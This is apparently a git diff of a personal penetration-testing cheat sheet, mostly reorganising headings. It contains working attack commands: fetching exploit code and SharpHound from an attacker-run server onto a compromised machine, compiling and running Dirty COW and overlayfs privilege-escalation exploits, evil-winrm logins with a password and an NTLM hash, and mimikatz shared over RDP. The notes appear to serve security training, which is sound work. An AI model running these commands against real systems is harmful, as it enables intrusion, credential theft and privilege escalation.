@@ -81,7 +81,7 @@
 #### **General Web Recon**
 
 - DNS Enumeration
-    - `host`, `dig`, `DNSRecon`(python tool)
+    - `nslookup`, `host`, `dig`, `DNSRecon`(python tool)
 
 - Publically available information
     - `whois`
@@ -732,12 +732,14 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 ### [PAYLOAD TRANSFER TECHNIQUES](#)
 
+##### Netcat
 - Using Netcat
     - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
         - `nc.exe -nlvp 1234 > test.txt`
     - Sned file from your machine
         - `nc -nv 10.5.19.93 1234 < test.txt`
-        
+
+##### HTTP Server
 - HTTP Server on kali
     - `service apache2 start`
     - `python -m SimpleHTTPServer 80`
@@ -747,24 +749,27 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
         - `wget http://10.17.107.227/exploit.c -P /tmp/`
         - `curl -O http://10.50.138.14/nmap`
 
+    - Fetching file using Powershell from kali to compromised machine
+        - On Kali run http webserver 
+            - `sudo python3 -m http.server 80`
+        - on compromised machine commandline
+            - open powershell from sommandline using command `powershell`
+            - on powershell run this to copy sharphound zip file for example
+                - `Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe`
+
+##### FTP Server
 - FTP Server on kali
     - `python -m pyftpdlib -p 21`
     - Fetching file
         - `get <filname>`
 
+##### SMB Server
 - SMB Server on kali
     - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  ` 
     - Fetching file
         - `copy \\10.17.107.227\kali\reverse.exe C:\PrivEsc\reverse.exe`
 
-- Fetching file using Powershell from kali to compromised machine
-    - On Kali run http webserver 
-        - `sudo python3 -m http.server 80`
-    - on compromised machine commandline
-        - open powershell from sommandline using command `powershell`
-        - on powershell run this to copy sharphound zip file for example
-            - `Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe`
-
+###### SSH SCP (Secure Copy Protocol)
 - SSH File transfer using linux `SCP`(Secure Copy Protocol)
     - Requirement - SSH credentials
         - From Local to Remote (kali to compromised)
@@ -787,7 +792,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
             - Syntex
                 - `scp user@remotehost:/home/user/file_name user2@remotehost2.com:/remote/directory`
 
-
+###### Evil-winrm
 - Uploading via WinRM CLI
     - upload and download
     - `evil-winrm -i '10.200.141.150' -u 'sam' -p 'Cayde@123'` > *Evil-WinRM* PS C:\Users\sam> `mkdir Temp`
@@ -798,24 +803,14 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - Script Loader feature from evil-winrm (-s flag)
         - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/` > *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1`
 
+###### RDP
 - Accessing file via RDP from kali with `/drive` option
     - Let’s you share a directory from Attack Machine to Target Machine GUI.
     - Example we share mimikatx directory
         - `xfreerdp /v:10.200.141.150 /u:sam /p:Cayde@123 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz,share`
             - C:\Windows\system32>`\\tsclient\share\x64\mimikatz.exe` 
 
-### [Exploitation](#)
 
-
-
-#### Kernel Exploits
-
-- Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) 
-    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`
-
-- Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation 
-    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
-    
 
 ### [WINDOWS POST EEXPLOITATION ENUMERATION](#)
 
@@ -1169,6 +1164,9 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
         - suggested dirtycow exploit, downloaded and used
     - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`
+
+- Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation 
+    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
 
 - Exploit DB
     - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
@@ -1546,7 +1544,7 @@ Conditions Required
         - ``./testelf` > `id`
 
 
-### [HASH IDENTIFICATION, GENERATION & Dumping) and Password Cracking](#)
+### [HASH IDENTIFICATION, GENERATION & DUMPING](#)
 
 ###### Hash Identification
 
@@ -1691,7 +1689,7 @@ Conditions Required
         - Decryption 
             - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`
 
-### [Windows Alternate Authentication (NTLM and Kerberos)](#)
+### [WINDOWS ALTERNATE AUTHENTICATION (NTLM and Kerberos)](#)
 By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
 alternatives available for NTLM and Kerberos auth are as follows.
 
